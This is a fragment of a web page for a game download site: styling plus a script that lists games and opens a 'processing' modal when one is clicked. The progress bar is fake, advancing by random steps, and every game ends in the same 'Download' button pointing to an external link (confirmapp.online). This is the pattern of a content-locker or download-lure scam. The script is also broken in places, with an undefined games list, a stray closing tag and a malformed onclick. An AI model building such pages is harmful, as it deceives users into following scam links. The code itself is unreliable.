<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
 font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;
 background:#000;color:#fff;min-height:100vh
}

/* HEADER */
header{
 background:#1a1a1a;
 padding:30px 20px;
 text-align:center;
 border-bottom:1px solid #2a2a2a
}
h1{color:#4ade80;font-size:32px}
.extension{color:#4ade80}
.tagline{color:#fbbf24;font-size:14px}

/* SEARCH */
.search-section{padding:20px;max-width:600px;margin:auto}
#filter{
 width:100%;
 padding:15px 20px;
 background:#1a1a1a;
 border:1px solid #333;
 border-radius:10px;
 color:#fff
}

/* GAME CARD */
.games-container{max-width:1200px;margin:auto;padding:20px}
.game-card{
 display:flex;align-items:center;
 background:#1a1a1a;
 border-radius:12px;
 padding:15px;margin-bottom:15px;
 cursor:pointer;
 border:1px solid #2a2a2a;
 transition:.3s
}
.game-card:hover{border-color:#4ade80;transform:translateX(5px)}
.game-img{
 width:70px;height:70px;
 border-radius:8px;
 object-fit:cover;margin-right:15px
}
.game-author{color:#4ade80;font-size:12px}
.game-title{font-size:16px;font-weight:600}
.game-description{color:#888;font-size:13px}

/* MODAL */
.processing-modal{
 display:none;
 position:fixed;
 inset:0;
 background:rgba(0,0,0,.9);
 z-index:9999;
 align-items:center;
 justify-content:center
}
.processing-content{
 background:#1a1a1a;
 padding:30px;
 border-radius:15px;
 max-width:360px;width:100%
}
.progress-bar-container{
 background:#333;
 height:14px;border-radius:10px;
 overflow:hidden
}
.progress-bar{
 background:#4ade80;
 height:100%;width:0%;
 text-align:center;
 font-size:11px;
 font-weight:700;
 color:#000
}

/* DOWNLOAD BUTTON */
.btn-down{
 margin-top:20px;
 width:100%;
 background:#4ade80;
 color:#000;
 border:none;
 padding:15px;
 border-radius:10px;
 font-size:16px;
 font-weight:700;
 cursor:pointer;
}
.btn-down:hover{background:#22c55e}
</style>

const list=document.getElementById("games-list");
const modal=document.getElementById("processing-modal");
const bar=document.getElementById("progress-bar");
const msg=document.getElementById("processing-msg");

function render(){
 list.innerHTML=games.map(g=>`
  <div class="game-card">
   <img src="${g.img}" class="game-img">
   <div>
    <div class="game-author">jafw.0</div>
    <div class="game-title">${g.title}</div>
    <div class="game-description">${g.desc}</div>
   </div>
  </div>
 `).join("");

 document.querySelectorAll(".game-card").forEach(c=>{
  c.onclick=startProcess;
 });
}
render();

function startProcess(){
 modal.style.display="flex";
 let progress=0;

 let int=setInterval(()=>{
  progress+=Math.floor(Math.random()*10)+5;
  if(progress>100)progress=100;

  bar.style.width=progress+"%";
  bar.textContent=progress+"%";

  if(progress>=100){
   clearInterval(int);
   msg.textContent="Ready to download";

   document.querySelector(".processing-content").insertAdjacentHTML(
    "beforeend",
    `<button class="btn-down" onclick="location.href='https://confirmapp.online/cl/i/1xx98x';".fadeIn()">
      Download
     </button>`
   );
  }
 },600);
}
</script>
